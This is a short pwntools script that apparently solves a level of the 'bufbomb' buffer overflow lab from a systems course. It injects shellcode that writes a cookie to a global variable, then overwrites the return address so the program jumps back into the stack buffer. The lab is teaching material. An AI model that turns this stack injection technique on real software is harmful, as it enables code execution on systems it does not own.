from pwn import *

f = open("./ID", "r")
id = f.read().splitlines()[0]
f.close()

sh = process(['./bufbomb', '-u', id])

length = 32
ebp = 0x556834a0
ret = 0x08048d05
cookie = 0x274adc8a
global_value_address = 0x0804c218

shellcode = asm('mov eax, ' + str(global_value_address) + '; mov dword ptr[eax], ' + str(cookie) + '; push ' + str(ret) + '; ret;')

exploit = flat([shellcode.ljust(length + 8, 'a'), 0xdeadbeef, ebp - length - 8])

print ' '.join(char.encode("hex") for char in exploit)

sh.sendline(exploit)

sh.interactive()
